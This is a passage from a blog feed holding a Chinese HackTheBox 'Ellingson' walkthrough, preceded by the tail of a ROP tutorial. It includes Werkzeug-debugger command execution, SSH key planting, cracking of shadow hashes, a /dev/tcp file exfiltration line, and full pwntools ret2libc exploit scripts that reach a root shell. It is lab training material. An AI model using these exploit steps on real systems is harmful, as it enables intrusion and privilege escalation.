libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n```\n\n```bash\n(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21644\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7f41e478b9c0\nlibcbase:0x7f41e470b000\nsystem_addr:0x7f41e475a440\nbin_sh_addr = 0x7f41e48bee9a/3\n```\n\n`GetShell` ，得到需要的地址后，我们可以进行获取`Shell`了\n\n再此之前，我们还需要一个`ret`来实现堆栈平衡\n\n```bash\n(pwn) ➜  Ellingson ROPgadget --binary garbage --only \"ret\"    \nGadgets information\n============================================================\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n```\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n\nret_addr = 0x0000000000401016\n\npayload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\np.sendline(payload2)\np.interactive()\n```\n\n然后我们运行，但是权限只是 `margo`的权限\n\n```bash\n$ $ id\nuid=1002(margo) gid=1002(margo) groups=1002(margo)\n```\n\n`GetRootShell`，我们还需要进行将`shell`权限提升，可以使用`setuid`\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n\nret_addr = 0x0000000000401016\n\nsetuid_addr = libcbase + libc.sym['setuid']\n\npayload2 = b'A' * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\n\np.sendline(payload2)\np.interactive()\n```\n\n运行获得 `RootShell`\n\n```bash\n(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 22208\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7fc6c64fd9c0\nlibcbase:0x7fc6c647d000\nsystem_addr:0x7fc6c64cc440\nbin_sh_addr = 0x7fc6c6630e9a\n[*] Switching to interactive mode\n\nEnter access password: \naccess denied.\n# $ id\nuid=0(root) gid=1002(margo) groups=1002(margo)\n```",
            "url": "https://www.sunsetaction.top/2025/06/15/PWN - 基本ROP",
            "title": "PWN - 基本ROP",
            "summary": "PWN 基本ROP https://ctf wiki.org/pwn/linux/user mode/stackoverflow/x86/basic rop/ 这里用到的所有题目：https://github.com/ctf wiki/ctf challenges/tree/master/pwn/l...",
            "date_modified": "2025-06-14T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "二进制安全",
                "PWN",
                "ROP",
                "ret2text",
                "ret2shellcode",
                "ret2syscall",
                "ret2libc"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/06/15/HackTheBoxMachine - Ellingson",
            "content_html": "\n# Machine - Ellingson\n\n> https://app.hackthebox.com/machines/Ellingson | `Linux` | `Hard`\n> \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image.png)\n\n## Recon\n\n```bash\n➜  Ellingson nmap -sT -min-rate 5000 10.10.10.139\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST\nNmap scan report for 10.10.10.139\nHost is up (0.062s latency).\nNot shown: 886 closed tcp ports (conn-refused), 112 filtered tcp ports (no-response)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap done: 1 IP address (1 host up) scanned in 0.59 seconds\n```\n\n```bash\n➜  Ellingson nmap -sT -A -p 22,80 10.10.10.139   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-13 09:01 CST\nNmap scan report for 10.10.10.139\nHost is up (0.056s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 49:e8:f1:2a:80:62:de:7e:02:40:a1:f4:30:d2:88:a6 (RSA)\n|   256 c8:02:cf:a0:f2:d8:5d:4f:7d:c7:66:0b:4d:5d:0b:df (ECDSA)\n|_  256 a5:a9:95:f5:4a:f4:ae:f8:b6:37:92:b8:9a:2a:b4:66 (ED25519)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n| http-title: Ellingson Mineral Corp\n|_Requested resource was http://10.10.10.139/index\n|_http-server-header: nginx/1.14.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.14\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   324.20 ms 10.10.16.1\n2   43.94 ms  10.10.10.139\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.57 seconds\n```\n\n访问`HTTP`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image1.png)\n\n内容告诉我们他们被`Ellingson`病毒给勒索了，并且短时间内不能访问服务超过五次，否则会被`ban` (目录扫描也不行)\n\n得到常见密码，这里可能存在弱密码\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image2.png)\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image3.png)\n\n```bash\n Love,Secret,Sex,God\n```\n\n```bash\nMargo Wallace\nEugene Belford\nDuke Ellingson\nHal\n```\n\n一个一个用户尝试之后没结果\n\n## Traceback 命令执行\n\n网页是由`Werkzeug`驱动的，并且异常处理是`Traceback`\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image4.png)\n\n貌似说可以命令执行\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image5.png)\n\n成功执行 `py` 语句\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image6.png)\n\n## SSH 公钥\n\n反弹 `shell` ，这里怎么弹都没法弹过来\n\n我们尝试写公钥\n\n```bash\n>>> import os;print(os.popen('whoami').read())\nhal\n\n>>> import os;print(os.popen('pwd').read())\n/\n\n>>> import os;print(os.popen('ls -al /home/hal').read())\ntotal 36\ndrwxrwx--- 5 hal  hal  4096 Jul 16  2021 .\ndrwxr-xr-x 6 root root 4096 Jul 16  2021 ..\n-rw-r--r-- 1 hal  hal   220 Mar  9  2019 .bash_logout\n-rw-r--r-- 1 hal  hal  3771 Mar  9  2019 .bashrc\ndrwx------ 2 hal  hal  4096 Jul 16  2021 .cache\ndrwx------ 3 hal  hal  4096 Jul 16  2021 .gnupg\n-rw-r--r-- 1 hal  hal   807 Mar  9  2019 .profile\ndrwx------ 2 hal  hal  4096 Jun 13 00:54 .ssh\n-rw------- 1 hal  hal   865 Mar  9  2019 .viminfo\n\n>>> import os;print(os.popen('echo \\\"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPj1PrDHdIKBOR5DxZjrQD5M3R4yRyMdJqSEDwP6SCfe root@kali\\\" > /home/hal/.ssh/authorized_keys').read())\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image7.png)\n\n## Crack Shadow\n\n发现`hal`用户所属有趣的组\n\n```bash\nhal@ellingson:~$ id\nuid=1001(hal) gid=1001(hal) groups=1001(hal),4(adm)\n```\n\n查找 `group`组有权限的文件\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image8.png)\n\n发现`shadow.bak`\n\n```bash\nhal@ellingson:~$ cat /var/backups/shadow.bak \nroot:*:17737:0:99999:7:::\ndaemon:*:17737:0:99999:7:::\nbin:*:17737:0:99999:7:::\nsys:*:17737:0:99999:7:::\nsync:*:17737:0:99999:7:::\ngames:*:17737:0:99999:7:::\nman:*:17737:0:99999:7:::\nlp:*:17737:0:99999:7:::\nmail:*:17737:0:99999:7:::\nnews:*:17737:0:99999:7:::\nuucp:*:17737:0:99999:7:::\nproxy:*:17737:0:99999:7:::\nwww-data:*:17737:0:99999:7:::\nbackup:*:17737:0:99999:7:::\nlist:*:17737:0:99999:7:::\nirc:*:17737:0:99999:7:::\ngnats:*:17737:0:99999:7:::\nnobody:*:17737:0:99999:7:::\nsystemd-network:*:17737:0:99999:7:::\nsystemd-resolve:*:17737:0:99999:7:::\nsyslog:*:17737:0:99999:7:::\nmessagebus:*:17737:0:99999:7:::\n_apt:*:17737:0:99999:7:::\nlxd:*:17737:0:99999:7:::\nuuidd:*:17737:0:99999:7:::\ndnsmasq:*:17737:0:99999:7:::\nlandscape:*:17737:0:99999:7:::\npollinate:*:17737:0:99999:7:::\nsshd:*:17737:0:99999:7:::\ntheplague:$6$.5ef7Dajxto8Lz3u$Si5BDZZ81UxRCWEJbbQH9mBCdnuptj/aG6mqeu9UfeeSY7Ot9gp2wbQLTAJaahnlTrxN613L6Vner4tO1W.ot/:17964:0:99999:7:::\nhal:$6$UYTy.cHj$qGyl.fQ1PlXPllI4rbx6KM.lW6b3CJ.k32JxviVqCC2AJPpmybhsA8zPRf0/i92BTpOKtrWcqsFAcdSxEkee30:17964:0:99999:7:::\nmargo:$6$Lv8rcvK8$la/ms1mYal7QDxbXUYiD7LAADl.yE4H7mUGF6eTlYaZ2DVPi9z1bDIzqGZFwWrPkRrB9G/kbd72poeAnyJL4c1:17964:0:99999:7:::\nduke:$6$bFjry0BT$OtPFpMfL/KuUZOafZalqHINNX/acVeIDiXXCPo9dPi1YHOp9AAAAnFTfEh.2AheGIvXMGMnEFl5DlTAbIzwYc/:17964:0:99999:7:::\n```\n\n`john`破解\n\n```bash\n➜  Ellingson john --wordlist=/usr/share/wordlists/rockyou.txt hash\nUsing default input encoding: UTF-8\nLoaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword123      (theplague)     \niamgod$08        (margo)     \n2g 0:01:56:26 DONE (2025-06-13 14:56) 0.000286g/s 2053p/s 3123c/s 3123C/s !!!playboy!!!7..*7¡Vamos!\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n```\n\n的到两个密码，其中`theplague`的密码是不正确的，`margo`的密码是正确的\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image9.png)\n\n`margo`用户可以拿到`user.txt`\n\n```bash\nmargo@ellingson:~$ cat user.txt \ne6e956999a23f338ffd6d933bf79ca9c\n```\n\n## 缓冲区溢出\n\n### 检查程序\n\n这里大致看了一会感觉没什么问题\n\n```bash\nmargo@ellingson:~$ find / -perm -u=s -type f 2>/dev/null\n/usr/bin/at              \n/usr/bin/newgrp       \n/usr/bin/pkexec           \n/usr/bin/passwd             \n/usr/bin/gpasswd            \n/usr/bin/garbage               \n/usr/bin/newuidmap            \n/usr/bin/sudo                 \n/usr/bin/traceroute6.iputils\n/usr/bin/chfn\n/usr/bin/newgidmap                         \n/usr/bin/chsh                             \n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/openssh/ssh-keysign\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/snapd/snap-confine\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/bin/su                     \n/bin/umount                 \n/bin/ntfs-3g                   \n/bin/ping                     \n/bin/mount                    \n/bin/fusermount\n```\n\n但是问题出现在`garbage` ，我以为它是`gc`（Garbage Collection）\n\n运行它的时候，会让你输入密码\n\n```bash\nmargo@ellingson:~$ garbage\nEnter access password: 111111111111111111111111111111111111111111111111111111\n\naccess denied.\n```\n\n拉出去逆向看一眼\n\n```bash\nint __fastcall __noreturn main(int argc, const char **argv, const char **envp)\n{\n  int v3; // [rsp+8h] [rbp-8h] BYREF\n  unsigned int v4; // [rsp+Ch] [rbp-4h]\n\n  v4 = check_user(argc, argv, envp);\n  set_username(v4);\n  if ( !(unsigned int)auth(v4) )\n    exit(-1);\n  puts(\"[+] W0rM || Control Application\");\n  puts(\"[+] ---------------------------\");\n  puts(\"Select Option\");\n  puts(\"1: Check Balance\");\n  puts(\"2: Launch\");\n  puts(\"3: Cancel\");\n  puts(\"4: Exit\");\n  while ( 1 )\n  {\n    while ( 1 )\n    {\n      while ( 1 )\n      {\n        printf(\"> \");\n        __isoc99_scanf(\"%d%*c\", &v3);\n        if ( v3 != 2 )\n          break;\n        launch();\n      }\n      if ( v3 > 2 )\n        break;\n      if ( v3 != 1 )\n        goto LABEL_14;\n      checkbalance();\n    }\n    if ( v3 != 3 )\n    {\n      if ( v3 == 4 )\n        exit(0);\nLABEL_14:\n      puts(\"Unknown option\");\n      exit(-1);\n    }\n    cancel();\n  }\n}\n```\n\n我们在开始运行的 `auth` 函数中发现了存在缓冲区溢出漏洞\n\n也就是让我们输入密码的地方，会有缓冲区溢出，`gets()` 函数会无限制地读取用户的输入，直到遇到换行符。如果攻击者输入一个超长的字符串（例如`200`个字符），多出来的`100`个字符就会溢出，覆盖掉栈上 `s1` 相邻的其他数据。\n\n```bash\n__int64 __fastcall auth(int a1)\n{\n  char dest[112]; // [rsp+10h] [rbp-F0h] BYREF\n  char s1[100]; // [rsp+80h] [rbp-80h] BYREF\n  char v4[12]; // [rsp+E4h] [rbp-1Ch] BYREF\n  int v5; // [rsp+F0h] [rbp-10h]\n\n  v5 = a1;\n  strcpy(v4, username);\n  printf(\"Enter access password: \");\n  gets(s1);\n  putchar(10);\n  if ( !strcmp(s1, \"N3veRF3@r1iSh3r3!\") )\n  {\n    strcpy(dest, \"access granted for user: \");\n    strcat(dest, v4);\n    syslog(6, dest);\n    puts(\"access granted.\");\n    return 1LL;\n  }\n  else\n  {\n    puts(\"access denied.\");\n    return 0LL;\n  }\n}\n```\n\n`64`位程序\n\n```bash\n➜  Ellingson file garbage \ngarbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped\n```\n\n保护措施情况，开启了`NX` \n\n```bash\n➜  Ellingson checksec garbage \n[*] Checking for new versions of pwntools\n    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-3.13/update to 'never' (old way).\n    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):\n        [update]\n        interval=never\n[*] You have the latest version of Pwntools (4.14.1)\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n```\n\n检查一下是否开启了 `ALSR` ，开启了完全`ALSR`\n\n```bash\nmargo@ellingson:~$ cat /proc/sys/kernel/randomize_va_space\n2\n```\n\n这里要使用 `ret2libc` 攻击\n\n### 寻找一个真实的地址\n\n首先我们查看`libc`文件\n\n```bash\nmargo@ellingson:~$ ldd /usr/bin/garbage \n        linux-vdso.so.1 (0x00007ffcd37ec000)\n        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff0364b2000)\n        /lib64/ld-linux-x86-64.so.2 (0x00007ff0368a3000)\n```\n\n将`/lib/x86_64-linux-gnu/libc.so.6`下载到靶机中\n\n```bash\n// kali\n➜  Ellingson nc -lvp 1234 > libc.so.6\n// Machine\nmargo@ellingson:~$ cat /lib/x86_64-linux-gnu/libc.so.6 > /dev/tcp/your-ip/1234\n```\n\n首先判断填充值，这里使用`garbage` \n\n```bash\n(pwn) ➜  Ellingson pwndbg garbage \npwndbg> cyclic 1024\naaaabaaacaaadaaa...acwaacxaacyaac\npwndbg> run\nStarting program: /root/Desktop/HackTheBox/Ellingson/garbage \n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\nEnter access password:aaaabaaacaaadaaa...acwaacxaacyaac\n```\n\n程序果不其然崩溃了\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image10.png)\n\n计算偏移值，这里使用`msf`\n\n```bash\n➜  Ellingson /usr/bin/msf-pattern_create -l 200\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab...Ag0Ag1Ag2Ag3Ag4Ag5Ag\n```\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Ellingson/image11.png)\n\n```bash\npwndbg> x/xg 0x7fffffffdf58\n0x7fffffffdf58: 0x3765413665413565\n```\n\n```bash\n(pwn) ➜  Ellingson /usr/bin/msf-pattern_offset -l 200 -q 0x3765413665413565        \n[*] Exact match at offset 136\n```\n\n得到偏移值`136` （PS：这里使用`pwndbg`的`cyclic`无法得到正确偏移值，但是`WP`中使用`gef`等都可以很容易就得到偏移值）\n\n得到偏移值后，我们选择一下获得哪个`plt`函数的真实地址\n\n```bash\npwndbg> plt\nSection .plt 0x401020 - 0x401170:\n0x401030: putchar@plt\n0x401040: strcpy@plt\n0x401050: puts@plt\n0x401060: fclose@plt\n0x401070: getpwuid@plt\n0x401080: getuid@plt\n0x401090: printf@plt\n0x4010a0: rewind@plt\n0x4010b0: fgetc@plt\n0x4010c0: read@plt\n0x4010d0: fgets@plt\n0x4010e0: strcmp@plt\n0x4010f0: getchar@plt\n0x401100: gets@plt\n0x401110: syslog@plt\n0x401120: access@plt\n0x401130: fopen@plt\n0x401140: __isoc99_scanf@plt\n0x401150: strcat@plt\n0x401160: exit@plt\n```\n\n`x64` 传参需要使用寄存器，`0x000000000040179b` 符合\n\n```bash\n(pwn) ➜  Ellingson ROPgadget --binary garbage --only \"pop|ret\"\nGadgets information\n============================================================\n0x0000000000401794 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401796 : pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401798 : pop r14 ; pop r15 ; ret\n0x000000000040179a : pop r15 ; ret\n0x0000000000401793 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401797 : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000401239 : pop rbp ; ret\n0x000000000040179b : pop rdi ; ret\n0x0000000000401799 : pop rsi ; pop r15 ; ret\n0x0000000000401795 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n\nUnique gadgets found: 15\n```\n\n这里选择获得`puts@plt` ，我们通过`pwn`连接`ssh` 来调试\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_add = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_add:{hex(puts_real_add)}\")\n```\n\n运行后我们的得到了`put`的真实地址`0x7f8eed3569c0`\n\n```bash\n(pwn) ➜  Ellingson python exp.py                              \n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21277\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_add = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_add:0x7f8eed3569c0\n```\n\n### 得到基地址\n\n基地址 = puts 函数真实地址 - puts 函数偏移地址\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n```\n\n```bash\n(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21460\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7f7ed83509c0\nlibcbase:0x7f7ed82d0000\n```\n\n### 获得其他地址\n\n得到基地址后，我们要得到 `system` 和 `/bin/sh`的地址\n\n函数真实地址 = 基地址 + 函数偏移值\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = ELF('./libc.so.6')\n\nputs_plt_addr = e.plt['puts']\nputs_got_addr = e.got['puts']\nstart_addr = e.symbols['_start']\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b'A' * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b'Enter access password:',payload1)\nputs_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nprint(f\"puts_real_addr:{hex(puts_real_addr)}\")\n\nlibcbase = puts_real_addr - libc.sym['puts']\nprint(f\"libcbase:{hex(libcbase)}\")\n\nsystem_addr = libcbase + libc.sym['system']\nprint(f\"system_addr:{hex(system_addr)}\")\n\nbin_sh_addr = libcbase + next(libc.search(b\"/bin/sh\"))\nprint(f\"bin_sh_addr = {hex(bin_sh_addr)}\")\n```\n\n```bash\n(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21644\n[!] ASLR is disabled for '/usr/bin/garbage'!\n[*] '/root/Desktop/HackTheBox/Ellingson/garbage'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] '/root/Desktop/HackTheBox/Ellingson/libc.so.6'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8, b'\\x00'))\nputs_real_addr:0x7f41e478b9c0\nlibcbase:0x7f41e470b000\nsystem_addr:0x7f41e475a440\nbin_sh_addr = 0x7f41e48bee9a/3\n```\n\n### GetShell\n\n得到需要的地址后，我们可以进行获取`Shell`了\n\n再此之前，我们还需要一个`ret`来实现堆栈平衡\n\n```bash\n(pwn) ➜  Ellingson ROPgadget --binary garbage --only \"ret\"    \nGadgets information\n============================================================\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n```\n\n```bash\nfrom pwn import *\nr = ssh(host='ellingson.htb', user='margo', password='iamgod$08')\np = r.process('/usr/bin/garbage')\ne = ELF('./garbage')\nlibc = 